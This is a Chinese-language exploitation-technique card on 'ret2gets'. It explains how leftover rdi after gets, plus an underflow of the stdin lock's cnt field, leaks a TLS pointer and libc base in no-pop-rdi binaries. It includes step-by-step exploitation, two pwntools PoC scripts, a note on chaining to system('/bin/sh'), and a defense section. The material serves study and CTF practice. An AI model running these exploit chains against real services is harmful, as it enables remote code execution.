---
id: binary-pwn-stack-ret2gets-stdfile-lock-tls-leak
title: ret2gets 泄露 libc：gets 返回后 rdi 残留 _IO_stdfile_0_lock，覆盖 cnt 绕过 NUL 截断由 puts 打印 owner 中的 TLS 指针
type: scenario
domain: binary
path: binary/pwn/stack
technique: ret2gets-io-lock-tls-leak
aliases:
- ret2gets
- gets 残留 rdi 泄露 TLS
- _IO_stdfile_0_lock 泄露 libc
- 无 pop rdi 的 libc 泄露
- glibc 无 pop rdi 泄漏
tags:
- pwn
- stack
- rop
- ret2libc
- gets
- ret2gets
- tls-leak
- glibc
- no-pop-rdi
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
affected_versions: glibc 2.30–2.36；glibc 2.37–2.39
verification:
  verified_by: verifier-T1-16
  verified_at: '2026-11-08T07:58:30+08:00'
  notes: 已对照原文与15张图核对：图2 rdi=0x7ffff7e1ba80(_IO_stdfile_0_lock)、图4/rbp+0x88 的 mov rdi,[rbp+88] 与 mov [rdi]=0、图5/6 解锁路径与 __lll_lock_wait_private 不改 rdi、图7 glibc2.29 用 rdx+lea rdi 的对照、图9 覆盖后 0xffffffff41414141(TLS owner 0x7ffff7fb8740)、图10/11/12 两次 gets 变体 cnt 0x41414140→0x41414100→0x414140ff、图13/14 printf(NULL) 后 rdi=_IO_2_1_stdout_、图15 LitCTF 远程 getshell 成功，均与卡内叙述一致。版本：原文写『上述exp在 2.35 上进行了测试，应该适用于 2.30-2.36』并在 exp 注释标 2.37-2.39 双 gets 变体（更高版本未尝试），区间有依据，已把 affected_versions 规整为 glibc 2.30–2.36；glibc 2.37–2.39 并去掉原文没有的括号注释。未验证点：2.30–2.32 与 2.37/2.38/2.39 原文未实测，属推断；TLS→libc 偏移 0x28c0 仅对应原作者 libc。
---

## 一句话结论

当栈溢出程序只有 `gets`、且因 glibc ≥2.34 移除 `__libc_csu_init` 而没有 `pop rdi` 时，可利用 `gets` 返回后 `rdi` 仍指向 `stdin->_lock`（`_IO_stdfile_0_lock`）这一编译器优化痕迹：再调一次 `gets` 把 `lock` 写成 4 字节、`cnt` 写成 0，使 `_IO_lock_unlock` 中的 `--cnt` 下溢成 `0xffffffff`（既不清空 `owner`、也不留 NUL），随后 `puts` 继续输出 `owner` 里保存的 `THREAD_SELF`（TLS）指针，按固定偏移换算出 libc 基址。

## 原理

- **为什么没有 `pop rdi; ret`**：该 gadget 通常来自 `<__libc_csu_init+99>` 的 `pop r15; ret` 尾字节（`41 5f c3` → `5f c3`）。glibc 2.34 的补丁删除了 `__libc_csu_init` 的二进制生成以消灭 ret2csu，连带使新编译程序的 `pop rdi; ret` 消失，`pop rsi; pop r15; ret`、`pop rbp; pop r12..r14; ret` 也一并消失。
- **`gets` 为什么会留下 `_IO_stdfile_0_lock`**：`_IO_gets` 用 `_IO_acquire_lock(stdin)` / `_IO_release_lock(stdin)` 做线程安全，展开后是 `_IO_lock_lock(*stdin->_lock)` 与 `_IO_lock_unlock(*stdin->_lock)`。解锁宏要调用 `lll_unlock(lock)`（futex），`lock` 地址是唯一参数；编译器为省一条 `mov`，直接在解锁路径把 `_lock`（`stdin` 结构体 `+0x88` 处的 `_lock` 字段所指对象）加载进 `rdi`，并在函数返回前不再改动它，于是 `gets` 返回时 `rdi = &_IO_stdfile_0_lock`。
- **`_IO_lock_t` 的布局**：`{ int lock; int cnt; void *owner; }`。加锁线程把 `THREAD_SELF`（指向 TLS/TCB）写入 `owner`；解锁时 `if (--cnt == 0) { owner = NULL; lll_unlock(...); }`。TLS 与 libc 基址的偏移在同版本 libc 中固定（原文环境 `libc = tls + 0x28c0`）。
- **绕过 NUL 截断**：`puts` 从 `&lock` 开始打印，遇到 `0x00` 就停。传入 `"A"*4 + "\x00"*3`（gets 再补一个结尾 NUL）后，`lock = 0x41414141`、`cnt = 0`；解锁时 `--cnt` 让 `cnt = 0xffffffff`，把原本 4 个 0 字节覆盖成 FF，于是前 8 字节为 `0xffffffff41414141`，没有 NUL，`puts` 继续打印 `owner`（6 字节有效地址 + 2 字节 0），`recv(6)` 即得 TLS。
- **为什么不直接用 printf**：`printf` 同样会走 stdio 加锁，但 `puts`/`printf` 均可；关键是第二次 `gets` 时 `rdi` 仍是 `&lock`，写入目标由此固定，不需要任何 gadget。
- **版本边界**：2.30–2.36 的 `_IO_lock_unlock` 无条件 `--cnt`，上述整数下溢可用；2.37 起改为 `if (SINGLE_THREAD_P && cnt == 0) ... else if (cnt == 0) ... else --cnt`，只有 `cnt != 0` 才递减，单次写入无法把 0 变成 FF，需改用“两次 gets”变体（见下）。

## 触发条件

- 64 位 ELF，存在 `gets` 栈溢出，`-no-pie`（或已知基址）、无 canary，且 `gets` 是返回前最后一个影响寄存器的调用（或 `rdi` 最终仍指向该锁）。
- 程序内没有 `pop rdi; ret`、`pop rsi; pop r15; ret`、`pop rbp; pop r12..r14; ret`（glibc ≥2.34 编译的典型情况）。
- 有 `puts`/`printf` 可调用，且能在泄露后回到 `main` 或再次触发溢出。
- libc 版本在 2.30–2.36（或 2.37–2.39 用双 gets 变体），且已知 `TLS → libc 基址` 的偏移。

## 利用步骤

1. 用 `ROPgadget` 确认无 `pop rdi; ret`；反汇编 `gets` 尾部，确认解锁路径为 `mov rdi, [rbp+0x88]` 且返回前 `rdi` 未改。
2. 计算溢出偏移，第一次溢出返回 `gets@plt`，再返回 `puts@plt`（可选再返回 `main`）。
3. 第二次输入 `"A"*4 + "\x00"*3`：覆盖 `_IO_lock_t` 的 `lock=0x41414141`、`cnt=0`。
4. `gets` 结束时 `--cnt` 下溢为 `0xffffffff`，`owner` 保留 TLS 指针；`puts(&lock)` 输出 8 字节头 + 6 字节 TLS。
5. `tls = u64(recv(6).ljust(8, b"\x00"))`，`libc_base = tls + <偏移>`（原文 0x28c0，需按目标 libc 校准）。
6. 第二次溢出用 libc 中的 `pop rdi; ret` + `/bin/sh` + `ret` + `system` 拿 shell。
7. glibc 2.37+：改为两次 `gets`，第一次写 `p32(0) + b"A"*4 + b"B"*8`（`cnt=0x41414141`，解锁后变 `0x41414140`），第二次写 `b"CCCC"` 让 `cnt=0x41414100`，解锁再减 1 得 `0x414140ff`，同样消除 NUL 后 `puts` 泄露。

## PoC

```python
# glibc 2.30–2.36
from pwn import *

e = context.binary = ELF('demo')
libc = ELF('libc.so.6')
p = e.process()

payload  = b"A" * 0x20            # buf
payload += p64(0)                 # saved rbp
payload += p64(e.plt['gets'])
payload += p64(e.plt['puts'])

p.sendlineafter(b"ROP me if you can!\n", payload)
p.sendline(b"A" * 4 + b"\x00" * 3)   # lock=0x41414141, cnt=0 → --cnt = 0xffffffff

p.recv(8)                          # puts 先输出 "AAAA" + 4 个 0xff
tls = u64(p.recv(6).ljust(8, b"\x00"))
libc.address = tls + 0x28c0        # 偏移按目标 libc 校准
log.info(f"tls={hex(tls)} libc={hex(libc.address)}")
```

```python
# glibc 2.37–2.39：两次 gets 版本
payload  = b"A" * 0x20 + p64(0)
payload += p64(e.plt['gets']) + p64(e.plt['gets']) + p64(e.plt['puts'])
p.sendlineafter(b"ROP me if you can!\n", payload)
p.sendline(p32(0) + b"A" * 4 + b"B" * 8)   # cnt 变 0x41414140
p.sendline(b"CCCC")                         # cnt 0x41414100 → --cnt = 0x414140ff
p.recv(8)
tls = u64(p.recv(6).ljust(8, b"\x00"))
```

## 变体与关联

- 变体（`rdi` 不是锁但可写）：先返回一次 `gets` 把 `rdi` 拉回 `&_IO_stdfile_0_lock`，再按原流程泄露。
- 变体（`rdi` 可读不可写）：直接 `puts(rdi)` 试读；若指向可打印内容可省掉第二次 `gets`。
- 变体（`rdi == NULL`）：`printf(NULL)` 会因 `ARGCHECK` 中 `Format == NULL` 直接返回，且返回时 `rdi` 指向 `stdout`；此时再调 `gets` 即写入 `_IO_2_1_stdout_`，可衔接 FSOP。
- 关联：[[binary-pwn-stack-gets-only-ret2dlresolve-fake-linkmap-ret2gets]]（同为 gets-only + 复用残留 rdi，但走伪造 link_map 解析 system，无需泄露）、[[binary-pwn-stack-pie-base-leak-csu-init-return-address]]（另一条用 csu 泄露的路径）、[[binary-pwn-stack-ret2libc-no-binsh-gets-bss-two-stage]]。
- 边界：glibc <2.30 的解锁把 `_lock` 先放 `rdx` 再 `lea rdi`，不成立；目标二进制若在 `gets` 后又调用了别的函数，`rdi` 会被改写。

## 检测与防御

- 编译侧：`-fstack-protector-all`、`-D_FORTIFY_SOURCE=2`、Full RELRO、PIE，阻断溢出与后续 GOT 利用。
- 代码侧：禁用 `gets`，改用 `fgets`/`read` 等有界读取；这是本链的唯一起点。
- 运行期：监控异常长行输入、返回地址跳到 `gets@plt`/`puts@plt` 的 ROP 序列、`_IO_stdfile_0_lock` 被改写（`lock`/`cnt` 出现 `0x41414141`、`0xffffffff` 等特征）。
- 沙箱：seccomp 限制 `execve`，降低泄露成功后的影响。
